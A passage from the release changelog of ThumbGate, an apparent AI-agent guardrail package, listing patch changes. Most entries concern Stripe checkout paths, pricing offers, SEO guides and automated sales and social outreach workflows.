- [#1787](https://github.com/IgorGanapolsky/ThumbGate/pull/1787) [`b2b9a28`](https://github.com/IgorGanapolsky/ThumbGate/commit/b2b9a2808fdfb97dd0dcf7a59d309cecf4b051b0) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Prioritize Workflow Hardening Diagnostic and Sprint checkout paths above lower-price Pro and intake recovery paths for high-intent visitors.

- [#1753](https://github.com/IgorGanapolsky/ThumbGate/pull/1753) [`4a77d5d`](https://github.com/IgorGanapolsky/ThumbGate/commit/4a77d5d80c5527934a554a1b601fa23559e3538c) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add $19 AI Agent Failure Quick Read checkout calls to action on the homepage and Pro paid recovery path.

- [#1748](https://github.com/IgorGanapolsky/ThumbGate/pull/1748) [`e83ce3c`](https://github.com/IgorGanapolsky/ThumbGate/commit/e83ce3c45338dfa8b3740cb8be22311ba8ed8626) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Remove the archived $99 hero diagnostic CTA and focus the paid homepage path on the current $499 diagnostic and $1500 workflow sprint offers.

- [#1734](https://github.com/IgorGanapolsky/ThumbGate/pull/1734) [`a7a95d4`](https://github.com/IgorGanapolsky/ThumbGate/commit/a7a95d4cbb71933e60c46bf4c0fec305d98d715e) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Remove remaining Pro trial copy and keep real browser checkout routed directly to Stripe-collected email/payment.

- [#1720](https://github.com/IgorGanapolsky/ThumbGate/pull/1720) [`a78a7eb`](https://github.com/IgorGanapolsky/ThumbGate/commit/a78a7eb3b51880fe62b4fe2296e41c89741d8d94) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Keep Ralph Mode revenue engagement reporting honest by counting LinkedIn posts only after the platform returns a real published post id, and let Ralph Loop use the stronger GitHub token for traffic analytics when configured.

- [#1679](https://github.com/IgorGanapolsky/ThumbGate/pull/1679) [`a0b7fac`](https://github.com/IgorGanapolsky/ThumbGate/commit/a0b7fac6512b0f76d942b1e4992651bd8a8d8e3b) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Automatically sync evidence-backed GTM revenue-loop targets into the local sales pipeline so operator follow-up starts from tracked leads instead of a separate manual import step.

- [#1721](https://github.com/IgorGanapolsky/ThumbGate/pull/1721) [`4d8ba82`](https://github.com/IgorGanapolsky/ThumbGate/commit/4d8ba82ac26749162108a0c95a00101be78f2604) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Let revenue status audits use the local ThumbGate operator config when environment keys are not set.

- [#1750](https://github.com/IgorGanapolsky/ThumbGate/pull/1750) [`d59d637`](https://github.com/IgorGanapolsky/ThumbGate/commit/d59d6374cad325bdafffc3289f18f141c3d0edd5) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add the same-day teardown checkout to the homepage paid path.

- [#1736](https://github.com/IgorGanapolsky/ThumbGate/pull/1736) [`0c3373b`](https://github.com/IgorGanapolsky/ThumbGate/commit/0c3373baeca216da3ae78e4433107f32ee83f07d) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a headless Skool community reader and read-only MCP connector for revenue research without taking over the user's browser.

- [#1781](https://github.com/IgorGanapolsky/ThumbGate/pull/1781) [`28dc90d`](https://github.com/IgorGanapolsky/ThumbGate/commit/28dc90d635ffad1ecbf7600e3287d4aa12ec0860) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a manual Zernio duplicate cleanup workflow for TikTok and Instagram posts.

- [#1737](https://github.com/IgorGanapolsky/ThumbGate/pull/1737) [`aceb673`](https://github.com/IgorGanapolsky/ThumbGate/commit/aceb673d7ca9b12e0d23850606217d00673ee5c2) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Enable Stripe Checkout recovery URLs and promotion-code entry for paid sessions so abandoned buyers can resume checkout.

- [#1755](https://github.com/IgorGanapolsky/ThumbGate/pull/1755) [`108f8ea`](https://github.com/IgorGanapolsky/ThumbGate/commit/108f8ea572e883fefe7b4f1d246a68957abeee61) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Remove the extra hosted email gate for real-browser Pro checkout starts so Stripe collects the buyer email directly while bot traffic still lands on the safe intent interstitial.

- [#1800](https://github.com/IgorGanapolsky/ThumbGate/pull/1800) [`3fc5b0b`](https://github.com/IgorGanapolsky/ThumbGate/commit/3fc5b0bf569a296b8479983d9e1b6609ae374621) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Clarify the public numbers page so configured checks are labeled as inventory, recorded block/warn counts are treated as the usage evidence, zero-occurrence blocker claims are suppressed, and scorer calibration is reported as n/a until the feedback sample has both safe and harmful outcomes.

- [#1746](https://github.com/IgorGanapolsky/ThumbGate/pull/1746) [`2377002`](https://github.com/IgorGanapolsky/ThumbGate/commit/2377002c459cef974896eaaf25da82472ce7777c) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a paid voice-agent reliability diagnostic offer to the Zernio promo publisher.

- [#1778](https://github.com/IgorGanapolsky/ThumbGate/pull/1778) [`4dbc0a9`](https://github.com/IgorGanapolsky/ThumbGate/commit/4dbc0a99e1edf67bafd9d9fa7761592a523dcacb) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Make remaining Zernio publishing workflows opt-in by default so scheduled social, Instagram, weekly, and manual offer dispatches cannot spend paid-provider capacity or publish repeated content unless explicitly enabled.

- [#1744](https://github.com/IgorGanapolsky/ThumbGate/pull/1744) [`d1d6504`](https://github.com/IgorGanapolsky/ThumbGate/commit/d1d65040232c7bf178e931cb3394b701e60e2985) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a guarded Zernio offer dispatch workflow with campaign tracking for manual paid-offer pushes.

- [#1775](https://github.com/IgorGanapolsky/ThumbGate/pull/1775) [`294bb52`](https://github.com/IgorGanapolsky/ThumbGate/commit/294bb521f671157cd4993712491857f0ba54026b) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Guard Zernio video autopilot behind an explicit publish opt-in, slow TikTok and Instagram video cadence to one distinct experiment per day, and add a TikTok engagement creative that asks for concrete blocked-command examples instead of repeating generic product cards.

## 1.16.21

### Patch Changes

- Add the AI Agent Workflow Migration Checklist guide with $1 first-rule, $19 quick-read, and $499 diagnostic checkout paths so agent-migration traffic can convert without waiting for a sales conversation.

## 1.16.20

### Patch Changes

- [#1709](https://github.com/IgorGanapolsky/ThumbGate/pull/1709) [`4efe783`](https://github.com/IgorGanapolsky/ThumbGate/commit/4efe7835fe21ef07d2307e47719a4c4898b18b63) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Gate Pro checkout creation on a real buyer email so low-intent clicks and preview traffic stop creating unrecoverable Stripe sessions.

- [#1708](https://github.com/IgorGanapolsky/ThumbGate/pull/1708) [`45b691d`](https://github.com/IgorGanapolsky/ThumbGate/commit/45b691db50400f860132770f9f29a0d459c191b9) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Route unconfirmed Pro checkout traffic through an intent page with Pro, workflow intake, and diagnostic/sprint options before creating Stripe sessions.

- [#1712](https://github.com/IgorGanapolsky/ThumbGate/pull/1712) [`675cb76`](https://github.com/IgorGanapolsky/ThumbGate/commit/675cb76589c963badcfaa0163cc465c57148cf73) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Track checkout intent-page buyer choices and preserve attribution on interstitial CTA telemetry.

- [#1713](https://github.com/IgorGanapolsky/ThumbGate/pull/1713) [`8adc576`](https://github.com/IgorGanapolsky/ThumbGate/commit/8adc576199eb4d52d12e4ede401a0209d9fb6553) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add direct diagnostic and workflow sprint payment options to the checkout intent router.

- [#1698](https://github.com/IgorGanapolsky/ThumbGate/pull/1698) [`3c06364`](https://github.com/IgorGanapolsky/ThumbGate/commit/3c0636415cd967162af673f560066f56713a499f) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Preserve checkout attribution through bot-safe confirmation links, route npm Pro upgrade CTAs through the canonical thumbgate.ai domain, and make normal Pro checkout pay-now instead of trial-first.

## 1.16.19

### Patch Changes

- [#1707](https://github.com/IgorGanapolsky/ThumbGate/pull/1707) [`a855444`](https://github.com/IgorGanapolsky/ThumbGate/commit/a85544471127546a3f43aef970c89778be56b274) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Expose non-secret hosted runtime presence in the billing summary so the revenue machine can recognize configured sprint payment links over the HTTP audit path.

## 1.16.18

### Patch Changes

- [#1702](https://github.com/IgorGanapolsky/ThumbGate/pull/1702) [`0cf6325`](https://github.com/IgorGanapolsky/ThumbGate/commit/0cf6325dd9ee984d4d40fc4a32028e2df6fc650a) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Teach the May 2026 revenue machine to treat configured sprint payment links as an agent-ready promotion path instead of a blocked setup item.

## 1.16.17

### Patch Changes

- [#1701](https://github.com/IgorGanapolsky/ThumbGate/pull/1701) [`f3e5259`](https://github.com/IgorGanapolsky/ThumbGate/commit/f3e52593623cbfbbe6f77f5b2cab14f168a693f5) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a no-card workflow intake recovery action to the checkout cancel page so cancelled Pro buyers can send the workflow before retrying payment.

## 1.16.16

### Patch Changes

- [#1700](https://github.com/IgorGanapolsky/ThumbGate/pull/1700) [`0aa053b`](https://github.com/IgorGanapolsky/ThumbGate/commit/0aa053b566e95449afefff986e4bb90e200581ba) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add direct paid diagnostic and AI Agent Governance Sprint CTAs to the governance sprint SEO guide.

## 1.16.15

### Patch Changes

- [#1696](https://github.com/IgorGanapolsky/ThumbGate/pull/1696) [`0a0af22`](https://github.com/IgorGanapolsky/ThumbGate/commit/0a0af22fddef13f80d5c731391bab2d9053d72bb) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add the AI Agent Governance Sprint conversion path with a generated guide, homepage routing, Team intake CTA coverage, and SEO tests for the bottom-funnel governance sprint offer.

- [#1699](https://github.com/IgorGanapolsky/ThumbGate/pull/1699) [`164b206`](https://github.com/IgorGanapolsky/ThumbGate/commit/164b206424f0b1e27fdd6da96a766f194014697b) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a no-card checkout recovery path from paid sprint CTAs into workflow sprint intake so interested buyers can send the workflow before paying.

## 1.16.14

### Patch Changes

- [#1695](https://github.com/IgorGanapolsky/ThumbGate/pull/1695) [`24b27ef`](https://github.com/IgorGanapolsky/ThumbGate/commit/24b27ef9bddb887ad8fab6e88d22d5e910370a39) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add the high-ROI May 2026 agent-governance batch: redaction-first reasoning trace analytics, RLSD-style step credit assignment, agent-design governance, Gemini Embedding 2 rollout policy, proxy-pointer RAG guardrails, retrieval precision guardrails, long-running agent context guardrails, reasoning efficiency guardrails, weekly Medium/community visibility artifacts, Bluesky reply-monitor wiring, and new proof-backed SEO/GEO acquisition pages.

- [#1688](https://github.com/IgorGanapolsky/ThumbGate/pull/1688) [`aad44cd`](https://github.com/IgorGanapolsky/ThumbGate/commit/aad44cdd42bc4d20989ef265248771e0651825c9) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add an RL-style agent reward model that scores session episodes, exports preference pairs, ranks gate candidates, and allocates verification depth for high-risk actions.

- [#1688](https://github.com/IgorGanapolsky/ThumbGate/pull/1688) [`aad44cd`](https://github.com/IgorGanapolsky/ThumbGate/commit/aad44cdd42bc4d20989ef265248771e0651825c9) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add Agentix Labs competitive positioning, Medium weekly draft orchestration, and Bluesky approved-reply publishing safeguards.

- [#1688](https://github.com/IgorGanapolsky/ThumbGate/pull/1688) [`aad44cd`](https://github.com/IgorGanapolsky/ThumbGate/commit/aad44cdd42bc4d20989ef265248771e0651825c9) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add local LaunchAgent wiring for autonomous Bluesky reply monitoring.

- [#1688](https://github.com/IgorGanapolsky/ThumbGate/pull/1688) [`aad44cd`](https://github.com/IgorGanapolsky/ThumbGate/commit/aad44cdd42bc4d20989ef265248771e0651825c9) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add checkout-cancel recovery offers for the sprint diagnostic and workflow hardening sprint.

- [#1695](https://github.com/IgorGanapolsky/ThumbGate/pull/1695) [`24b27ef`](https://github.com/IgorGanapolsky/ThumbGate/commit/24b27ef9bddb887ad8fab6e88d22d5e910370a39) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add DeepSeek-V4 runtime guardrails and upstream contribution discovery so operators can gate sparse-attention model rollouts and rank real dependency repos for proof-backed PR opportunities.

- [#1688](https://github.com/IgorGanapolsky/ThumbGate/pull/1688) [`aad44cd`](https://github.com/IgorGanapolsky/ThumbGate/commit/aad44cdd42bc4d20989ef265248771e0651825c9) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Normalize public marketing HTML to the configured ThumbGate origin and emit the standard GA4 config snippet so Google tag verification can detect the live site.

- [#1687](https://github.com/IgorGanapolsky/ThumbGate/pull/1687) [`1a584bc`](https://github.com/IgorGanapolsky/ThumbGate/commit/1a584bc439fd48eeb270b9f5f2fb2e905d199c2a) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Preserve verified historical commercial revenue proof in GTM operator assets when hosted billing cannot be verified for the current run.

- [#1673](https://github.com/IgorGanapolsky/ThumbGate/pull/1673) [`69ec242`](https://github.com/IgorGanapolsky/ThumbGate/commit/69ec242087198d6283165e097434104ea88fdb4d) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Clarify on the homepage that the 7-day free trial applies to Pro, while Team starts through the Workflow Hardening Sprint intake instead of a self-serve trial.

- [#1688](https://github.com/IgorGanapolsky/ThumbGate/pull/1688) [`aad44cd`](https://github.com/IgorGanapolsky/ThumbGate/commit/aad44cdd42bc4d20989ef265248771e0651825c9) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add knowledge-graph-informed gate templates, guide content, and engagement copy for code graph safety positioning.

- [#1692](https://github.com/IgorGanapolsky/ThumbGate/pull/1692) [`2525e41`](https://github.com/IgorGanapolsky/ThumbGate/commit/2525e4137cde61680da604f49c5196eb68b8b662) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Complete the GTM operator send-now handoff with contact surfaces, company context, and lifecycle sales commands for call booked, sprint intake, and paid stages.

- [#1688](https://github.com/IgorGanapolsky/ThumbGate/pull/1688) [`aad44cd`](https://github.com/IgorGanapolsky/ThumbGate/commit/aad44cdd42bc4d20989ef265248771e0651825c9) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a macOS LaunchAgent installer for aggressive local Reddit thread monitoring.

- [#1688](https://github.com/IgorGanapolsky/ThumbGate/pull/1688) [`aad44cd`](https://github.com/IgorGanapolsky/ThumbGate/commit/aad44cdd42bc4d20989ef265248771e0651825c9) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add Reddit thread watch orchestration that drafts replies for configured public discussion URLs.

- [#1678](https://github.com/IgorGanapolsky/ThumbGate/pull/1678) [`c9112e4`](https://github.com/IgorGanapolsky/ThumbGate/commit/c9112e43f6dddf8122af40660dc870d0d1476dc1) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Prioritize actionable hosted revenue-status configuration gaps over stale local-fallback labels when hosted signals are visible.

- [#1688](https://github.com/IgorGanapolsky/ThumbGate/pull/1688) [`aad44cd`](https://github.com/IgorGanapolsky/ThumbGate/commit/aad44cdd42bc4d20989ef265248771e0651825c9) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Keep the legacy Stripe webhook route unauthenticated and signature-verified so older Stripe endpoints do not fail behind API-key auth. Add Stripe webhook audit and legacy-cleanup operator commands so dead `rlhf-feedback-loop` endpoints can be detected and disabled without rotating the active ThumbGate webhook secret.

- [#1688](https://github.com/IgorGanapolsky/ThumbGate/pull/1688) [`aad44cd`](https://github.com/IgorGanapolsky/ThumbGate/commit/aad44cdd42bc4d20989ef265248771e0651825c9) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add developer-machine supply-chain guardrails, buyer guide content, and engagement copy for AI coding assistant security positioning.

- [#1675](https://github.com/IgorGanapolsky/ThumbGate/pull/1675) [`0532343`](https://github.com/IgorGanapolsky/ThumbGate/commit/05323432f71d0603acd35c6731c2f86d0d85067c) Thanks [@dependabot](https://github.com/apps/dependabot)! - Update the direct development dependency on undici to 8.2.0.

## 1.16.13

### Patch Changes

- [#1653](https://github.com/IgorGanapolsky/ThumbGate/pull/1653) [`a072ef0`](https://github.com/IgorGanapolsky/ThumbGate/commit/a072ef098a131030cb1b28c12356fc1edcf8b609) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Refresh the autonomous revenue loop so it emits the Roo-to-Cline demand pack alongside the other evidence-backed sales assets and operator outreach queues.

- [#1662](https://github.com/IgorGanapolsky/ThumbGate/pull/1662) [`d3d78f2`](https://github.com/IgorGanapolsky/ThumbGate/commit/d3d78f286acca57deb6907c4c40398d4d6b5ac99) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Expand the README buyer-question guide shelf so GitHub visitors can reach the active Google Cloud MCP guardrails and Roo-to-Cline migration conversion pages alongside the existing proof-backed acquisition guides.

- [#1559](https://github.com/IgorGanapolsky/ThumbGate/pull/1559) [`54cf97e`](https://github.com/IgorGanapolsky/ThumbGate/commit/54cf97ee57ff2296e7b74b93d37256fc104d8e2c) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a machine-readable MCP directory surfaces sheet to the GTM revenue-pack outputs so directory repair and submission work can use one evidence-backed CSV alongside the existing pack markdown, JSON, and operator queue artifacts.

- [#1655](https://github.com/IgorGanapolsky/ThumbGate/pull/1655) [`5054f22`](https://github.com/IgorGanapolsky/ThumbGate/commit/5054f227a9f3176d7249b73970111e7cb08bda0f) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Refresh the MCP directory repair pack so Glama and punkpeye operator guidance matches the current live directory state instead of stale legacy repair steps.

- [#1657](https://github.com/IgorGanapolsky/ThumbGate/pull/1657) [`3c02575`](https://github.com/IgorGanapolsky/ThumbGate/commit/3c02575a9f0065f444a67f033055013d086d4455) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Route Roo shutdown first-touch traffic through the owned migration guide before the raw Cline install doc, and add setup-guide follow-on CTAs for better proof-backed conversion.

- [#1661](https://github.com/IgorGanapolsky/ThumbGate/pull/1661) [`4c54b53`](https://github.com/IgorGanapolsky/ThumbGate/commit/4c54b53951d7c6827240af404a00c98072fde54a) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a Roo migration send-now handoff so the demand-pack generator emits one evidence-backed markdown, JSON, and CSV execution layer with CTA sequencing and sales-pipeline logging commands.

- [#1647](https://github.com/IgorGanapolsky/ThumbGate/pull/1647) [`3277d2d`](https://github.com/IgorGanapolsky/ThumbGate/commit/3277d2d216dfda1512fba775ca56d4380d3fdaaa) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Refresh the revenue-loop automation and buyer-facing sales surfaces so generated GTM packs follow current local revenue truth, keep free-tier limits evidence-backed, and rewrite channel-specific outreach assets during default runs.

## 1.16.12

### Patch Changes

- [#1639](https://github.com/IgorGanapolsky/ThumbGate/pull/1639) [`932a96e`](https://github.com/IgorGanapolsky/ThumbGate/commit/932a96e83f1caf725fc37e8912b1915ba05eba7f) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Surface the Roo-to-Cline migration guide in ThumbGate discovery pages and add evidence-backed Roo sunset outreach drafts with regression coverage.

- [#1640](https://github.com/IgorGanapolsky/ThumbGate/pull/1640) [`2a8985d`](https://github.com/IgorGanapolsky/ThumbGate/commit/2a8985dd6c18bd687c2dedbf399e75735b56440d) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix hosted revenue status audits so the Railway fallback honors CLI fetch timeout overrides before falling back to local zero-revenue diagnostics.

- [#1644](https://github.com/IgorGanapolsky/ThumbGate/pull/1644) [`671631a`](https://github.com/IgorGanapolsky/ThumbGate/commit/671631ab6ab636122045503c5b8ef9561efefd98) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add an evidence-backed Roo sunset demand pack with tracked migration surfaces, operator queue exports, and channel draft assets.

## 1.16.11

### Patch Changes

- [#1632](https://github.com/IgorGanapolsky/ThumbGate/pull/1632) [`a94318c`](https://github.com/IgorGanapolsky/ThumbGate/commit/a94318cc57e7879e5c476b246f0b38f77cfdd1df) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add May 2026 revenue-machine planning, paid Workflow Hardening checkout link support, and GA4 lead/checkout event hooks.

- [#1633](https://github.com/IgorGanapolsky/ThumbGate/pull/1633) [`4b1d58f`](https://github.com/IgorGanapolsky/ThumbGate/commit/4b1d58f849085d3c2e071dfa4be6067aedf6149b) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Keep revenue-loop operator handoffs evidence-backed by carrying proof links and claim guardrails into the send-now exports.

## 1.16.10

### Patch Changes

- [#1536](https://github.com/IgorGanapolsky/ThumbGate/pull/1536) [`38c306d`](https://github.com/IgorGanapolsky/ThumbGate/commit/38c306dbc52fbe2f35a9e4225ce0397cf077150e) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a generated operator send-now markdown handoff to the GTM revenue loop so operators can execute the ranked outreach and self-serve close queue without converting the checked-in JSON or CSV outputs by hand.

- [#1596](https://github.com/IgorGanapolsky/ThumbGate/pull/1596) [`7fecf17`](https://github.com/IgorGanapolsky/ThumbGate/commit/7fecf174fe797d0eb50e61421155262a1463ccde) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Preserve paid revenue evidence in the GTM operator loop when the current day has only checkout activity but the hosted 30-day or lifetime windows contain booked revenue.

## 1.16.9

### Patch Changes

- [#1361](https://github.com/IgorGanapolsky/ThumbGate/pull/1361) [`20c6eeb`](https://github.com/IgorGanapolsky/ThumbGate/commit/20c6eeb262b61a82b811606f1785c342c3f64f52) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Include the Aiventyx marketplace plan in the autonomous GTM revenue-loop bundle and refresh the checked-in operator sales assets from the unified automation flow.

- [#1365](https://github.com/IgorGanapolsky/ThumbGate/pull/1365) [`5d331f9`](https://github.com/IgorGanapolsky/ThumbGate/commit/5d331f9aa9fad7d785f1dbd32ef178dd04529f0f) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Harden the GTM revenue-loop buyer-intent routing so low-intent educational targets are filtered from the operator queue and first-touch Pro outreach stays discovery-first until pain is confirmed.

- [#1367](https://github.com/IgorGanapolsky/ThumbGate/pull/1367) [`24fc667`](https://github.com/IgorGanapolsky/ThumbGate/commit/24fc6675734e5e30a4f5096f9fdd22ea13ba5d27) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add Codex plugin follow-up sequences to the revenue pack and refresh the operator sales asset.

- [#1421](https://github.com/IgorGanapolsky/ThumbGate/pull/1421) [`69ec01a`](https://github.com/IgorGanapolsky/ThumbGate/commit/69ec01a8d19b3c7f1dff37cc82fdc74f98d24cf8) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a Codex-ready target queue export to the revenue pack and refresh the operator-facing Codex sales asset.

- [#1392](https://github.com/IgorGanapolsky/ThumbGate/pull/1392) [`2c26dcd`](https://github.com/IgorGanapolsky/ThumbGate/commit/2c26dcd75221d0e461f8bf4bc8329c8b531c2d3d) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Refresh the GTM outreach renderer so operator-ready follow-up, warm discovery, and cold GitHub targets are generated from the current evidence-backed revenue queue instead of a stale static draft.

- [#1354](https://github.com/IgorGanapolsky/ThumbGate/pull/1354) [`aa0e652`](https://github.com/IgorGanapolsky/ThumbGate/commit/aa0e652cbd6eae2cf57268905f15064a102d9db8) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add evidence-backed Gemini CLI channel outreach exports to the GTM demand pack, including active social drafts and a dedicated operator CSV artifact.

- [#1413](https://github.com/IgorGanapolsky/ThumbGate/pull/1413) [`433ae05`](https://github.com/IgorGanapolsky/ThumbGate/commit/433ae056348de81fc8d50ee293eea613bdd3f949) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Refresh the autonomous GTM runner so it regenerates the GitHub outreach asset from the current revenue-loop queue and keeps the checked-in outreach targets aligned with the latest evidence-backed pipeline state.

- [#1455](https://github.com/IgorGanapolsky/ThumbGate/pull/1455) [`8c39c59`](https://github.com/IgorGanapolsky/ThumbGate/commit/8c39c590015f39ea3eee74032b2b76555731d8b0) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Refresh the GTM revenue loop with a live GitLab review-automation discovery lane, keep self-serve hook prospects on the guide-first close path, and regenerate the operator outreach pack from the updated evidence set.

- [#1457](https://github.com/IgorGanapolsky/ThumbGate/pull/1457) [`2b6a352`](https://github.com/IgorGanapolsky/ThumbGate/commit/2b6a352dcebff52f5f37d0acc735d1d006629b60) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Broaden GTM discovery toward GitLab review workflows and keep self-serve hook prospects on the guide-first outreach lane.

- [#1448](https://github.com/IgorGanapolsky/ThumbGate/pull/1448) [`40f4077`](https://github.com/IgorGanapolsky/ThumbGate/commit/40f4077f37af099877c77cc30dfd0102cad1b278) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Expand the revenue loop's GitHub discovery into ServiceNow agent workflow, approval-policy, and workflow-guardrail repos, then refresh the checked-in operator handoff assets from the stronger governance-focused evidence mix.

- [#1387](https://github.com/IgorGanapolsky/ThumbGate/pull/1387) [`9e3e724`](https://github.com/IgorGanapolsky/ThumbGate/commit/9e3e72432816673449f6127a836b29a461eaade2) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Enrich the GTM revenue-loop prospect queue with public GitHub website and company surfaces, carry the extra contact metadata into the generated operator assets, and skip the hosted revenue-status audit when local metrics are explicitly requested so local evidence-backed artifact refreshes complete quickly.

- [#1358](https://github.com/IgorGanapolsky/ThumbGate/pull/1358) [`c5a3606`](https://github.com/IgorGanapolsky/ThumbGate/commit/c5a3606fc8474f30cef2a9bbcb72fa0942d804b2) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Align the customer discovery sprint guide with the actual revenue-loop artifact pack, including the default `docs/marketing` outputs, warm-outreach handoff files, and ChatGPT acquisition assets.

- [#1390](https://github.com/IgorGanapolsky/ThumbGate/pull/1390) [`277bfd6`](https://github.com/IgorGanapolsky/ThumbGate/commit/277bfd6b2e8d292f44480da83a59e87dc17ff552) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Restore authenticated GitHub prospecting in the GTM revenue loop by falling back to the local `gh` login when explicit GitHub API tokens are not set, and refresh the checked-in operator acquisition assets with the recovered cold-target queue.

- [#1373](https://github.com/IgorGanapolsky/ThumbGate/pull/1373) [`3c60cef`](https://github.com/IgorGanapolsky/ThumbGate/commit/3c60cefc013de43d18be86ffb0485329e521d505) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Emit stable lead IDs and per-target sales pipeline commands in the GTM revenue loop operator assets.

- [#1383](https://github.com/IgorGanapolsky/ThumbGate/pull/1383) [`86415db`](https://github.com/IgorGanapolsky/ThumbGate/commit/86415db82b8eae7fd399162f5cbc6e2f300f344e) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Preserve the canonical Pro checkout CTA in generated GTM marketplace assets when the current target set is sprint-only.

- [#1444](https://github.com/IgorGanapolsky/ThumbGate/pull/1444) [`39ee871`](https://github.com/IgorGanapolsky/ThumbGate/commit/39ee8710aef72374c4c48523e13029744b2b4d8a) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Broaden the revenue loop's GitHub discovery toward workflow approval, review, incident, and Jira control-surface repos while filtering portfolio-style false positives, then refresh the checked-in operator handoff assets from the new evidence mix.

- [#1441](https://github.com/IgorGanapolsky/ThumbGate/pull/1441) [`46b816a`](https://github.com/IgorGanapolsky/ThumbGate/commit/46b816ac43554ae6c2cf2d7924ea9b82eb38450c) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Harden the GTM revenue loop so operator assets distinguish live hosted billing proof from historical or local fallback data before they claim current revenue traction.

- [#1377](https://github.com/IgorGanapolsky/ThumbGate/pull/1377) [`2d5b20c`](https://github.com/IgorGanapolsky/ThumbGate/commit/2d5b20cdcacf95f5ca007d6d13f4e824b8709648) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Prefer hosted revenue-status truth in the GTM revenue loop when the local operational summary falls back, and refresh the generated marketplace and outreach assets with the verified hosted billing snapshot.

- [#1465](https://github.com/IgorGanapolsky/ThumbGate/pull/1465) [`8578d03`](https://github.com/IgorGanapolsky/ThumbGate/commit/8578d0336161354d3cc2a0865b3d405446403f3d) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Clarify the public landing-page buying paths so Sprint, Solo Pro, and free OSS routing match the repo's current commercial truth.

